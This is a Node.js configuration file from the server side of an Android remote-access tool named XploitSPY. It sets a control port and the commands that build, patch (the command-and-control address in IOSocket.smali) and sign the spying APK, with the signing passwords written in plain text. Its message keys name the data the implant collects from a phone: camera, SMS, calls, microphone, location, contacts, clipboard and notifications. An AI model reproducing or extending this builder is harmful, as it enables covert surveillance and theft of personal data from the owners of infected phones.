const path = require('path');

exports.debug = false;

exports.web_port = 80;
exports.control_port = 22222;

// Paths - 新的Gradle构建流程
exports.clientPath = path.join(__dirname, '../../client');
exports.configFilePath = path.join(__dirname, '../../client/app/src/main/java/com/remote/app/Config.java');
exports.apkOutputPath = path.join(__dirname, '../assets/webpublic');
exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/XploitSPY.apk');
exports.apkUnsignedPath = path.join(__dirname, '../../client/app/build/outputs/apk/release/app-release-unsigned.apk');

exports.downloadsFolder = '/client_downloads'
exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder)

// 签名配置
exports.certPath = path.join(__dirname, '../app/factory/release.jks');
exports.apkSign = path.join(__dirname, '../app/factory/', 'uber-apk-signer-1.1.0.jar');

// ApkTool方案配置（无需Android SDK）
exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool.jar');
exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
// 注意：新的IOSocket.java使用C2_SERVER变量，smali中的类名可能不同
exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/remote/app/IOSocket.smali');
exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk');

// ApkTool构建命令
exports.apktoolBuildCommand = `java -jar "${exports.apkTool}" b "${exports.smaliPath}" -o "${exports.apkBuildPath}"`;
exports.apktoolSignCommand = `java -jar "${exports.apkSign}" -a "${exports.apkBuildPath}" --ks "${exports.certPath}" --ksAlias key0 --ksPass release101 --ksKeyPass release101 --out "${exports.apkOutputPath}"`;

// Gradle构建命令 (Windows/Linux兼容，需要Android SDK)
const isWindows = process.platform === 'win32';
const gradleCmd = isWindows ? 'gradlew.bat' : './gradlew';
exports.gradlePath = path.join(exports.clientPath, gradleCmd);
exports.gradleBuildCommand = `${exports.gradlePath} assembleRelease`;
exports.gradleSignCommand = `java -jar "${exports.apkSign}" -a "${exports.apkUnsignedPath}" --ks "${exports.certPath}" --ksAlias key0 --ksPass release101 --ksKeyPass release101 --out "${exports.apkOutputPath}"`;

exports.messageKeys = {
    camera: '0xCA',
    files: '0xFI',
    call: '0xCL',
    sms: '0xSM',
    mic: '0xMI',
    location: '0xLO',
    contacts: '0xCO',
    wifi: '0xWI',
    notification: '0xNO',
    clipboard: '0xCB',
    installed: '0xIN',
    permissions: '0xPM',
    gotPermission: '0xGP'
}

exports.logTypes = {
    error: {
        name: 'ERROR',
        color: 'red'
    },
    alert: {
        name: 'ALERT',
        color: 'amber'
    },
    success: {
        name: 'SUCCESS',
        color: 'limegreen'
    },
    info: {
        name: 'INFO',
        color: 'blue'
    }
}